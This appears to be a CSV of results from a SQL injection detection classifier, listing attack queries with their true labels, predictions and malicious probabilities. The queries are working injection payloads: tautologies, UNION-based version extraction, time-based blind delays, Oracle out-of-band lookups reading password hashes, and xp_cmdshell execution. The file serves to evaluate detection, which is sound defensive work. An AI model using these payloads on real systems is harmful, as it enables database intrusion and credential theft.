Query,Label,predicted,correct,malicious_probability
a' waitfor delay '0:0:10'--,1,1,True,0.9999184366648721
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9999916028995061
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,True,0.999986290348906
and 1 in   (  select var from temp  )  --,1,1,True,0.9997942404081723
hi'  )   or   (  'a'  =  'a,1,1,True,0.9999784078209791
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.9395226936605193
"admin"" or 1  =  1",1,1,True,0.9999999999322284
"""  )   or true--",1,1,True,0.9985644475048475
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9999998393128361
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,1,True,0.999996501876049
1  )   or pg_sleep  (  __TIME__  )  --,1,1,True,0.9999277516714548
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1,True,0.9999968902234209
"""  )   or sleep  (  __TIME__  )    =  """,1,1,True,0.9582753100572519
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1,True,0.9999974421737265
"admin""  )   or   (  ""1""  =  ""1""--",1,1,True,0.999999999964025
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1,True,0.9999838129545812
; exec xp_regread,1,1,True,0.9980814696811914
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,True,0.9999995205896386
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1,True,0.999997324336424
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
1 and 1  =  1,1,1,True,0.9965075580723456
or 0  =  0 #,1,1,True,0.9987960320044021
union select * from users where login   =   char ...,1,1,True,0.9953655396797553
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1,True,0.9999893206037411
admin'  )   or '1'  =  '1'--,1,1,True,0.9999999999999998
1;SELECT *,1,0,False,0.016987751661558168
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,True,0.99999342803961
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999995725251889
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999995565868917
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9995142630435578
procedure,1,0,False,0.38076240111585086
or ''  =  ',1,1,True,0.9995816190845397
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9905574053739702
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.8649877718995899
\'; desc users; --,1,1,True,0.9999999757136039
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,1,True,0.9999951660635218
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1,True,0.9999999389927992
""" or """"^""",1,1,True,0.9669658460202891
"""-""",1,1,True,0.9188848623785282
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9999952825231686
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,True,0.999987577656104
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,1,True,0.9999933751494821
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999995725251889
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
admin'/*,1,1,True,0.9999999999999998
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,1,True,0.9999987716979838
||UTL_HTTP.REQUEST,1,1,True,0.9982703757833202
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.7143933759813575
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,True,0.9999989986160549
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9992675806282292
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1,True,0.9999891822099171
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1,True,0.9999954672639062
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1,True,0.9999999538238812
1 uni/**/on select all from where,1,1,True,0.9999998041879096
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1,True,0.9999929056511287
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1,True,0.9999904726896005
admin'  )   or '1'  =  '1'#,1,1,True,0.9999999999999998
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,1,True,0.9940434921753694
or '7659'  =  '7659,1,1,True,0.9578854061437978
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1,True,0.9999876145710488
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.6350430468293172
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,1,True,0.9999953240240057
or true--,1,1,True,0.9996650094269909
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1,True,0.9999882571546858
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1,True,0.9999997217700937
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,1,True,0.9999931470512057
""" or true--",1,1,True,0.9992860870781756
select * from users where id  =  1. or 1  =  1 -- 1,1,1,True,0.9999974421737265
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9999860029036489
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
â or 3  =  3 --,1,1,True,0.9999726346986112
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1,True,0.8866094719845704
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999883211232499
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1,True,0.9999963983326072
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1,True,0.9999935655981287
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9999930887423796
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,1,True,0.9999970440350298
 or uid like '%,1,1,True,0.9643611286613873
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1,True,0.9999999585929232
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1,True,0.9999994516020007
23 or 1  =  1; --,1,1,True,0.9999997288985865
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,1,True,0.9999954719004853
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.9999959767613903
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,1,True,0.9999966007202171
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1,True,0.9999997217700937
0 or 1  =  1,1,1,True,0.9986177537221099
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1,True,0.999997710253071
"admin""  )   or ""1""  =  ""1",1,1,True,0.9999999998894711
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,1,True,0.9999965751433111
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.8738466721627265
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.9256918357081957
&apos; OR,1,1,True,0.999999638996725
sqlvuln;,1,1,True,0.8252662055880078
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,True,0.9999970927883208
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,1,True,0.999999941831708
""" or """"*""",1,1,True,0.9669658460202891
"hi or 1  =  1 --""",1,1,True,0.999998480575977
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.999984816196235
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,True,0.9999129129454019
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999995513327754
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,True,0.9999993930824025
select * from information_schema.tables--,1,1,True,0.9999752249123776
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,1,True,0.9999972099396688
   (  select top 1,1,1,True,0.9691856310442062
Ã½ or 1  =  1 --,1,1,True,0.9999989534141529
a' --,1,1,True,0.999999999962629
 or 1  =  1 /*,1,1,True,0.999992213607904
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,1,True,0.9999889361627752
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1,True,0.9999997217700937
--,1,1,True,0.9999999999999483
"exec sp_addlogin 'name' , 'password'",1,1,True,0.9990851698068094
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999879656307901
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,1,True,0.9050403740355492
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,1,True,0.9999969090477417
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9999875974476293
group by userid having 1  =  1--,1,1,True,0.9998896597351302
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,1,True,0.9999935655981287
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1,True,0.99999791373573
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,1,True,0.9999985079503704
‘ or 1  =  1 --,1,1,True,0.9999989534141529
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,1,True,0.9999933751494821
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,True,0.999996890223988
or 'a'  =  'a,1,1,True,0.999988504045586
declare @s varchar  (  22  )   select @s   = ,1,1,True,0.8151451810661168
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1,True,0.999987577656104
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,1,True,0.9999920949324806
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9999930887423796
@variable,1,1,True,0.9675083652307952
; exec master..xp_cmdshell,1,1,True,0.9986135937207752
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1,True,0.999996990717594
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,True,0.9999843770108199
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1,True,0.9999843770108199
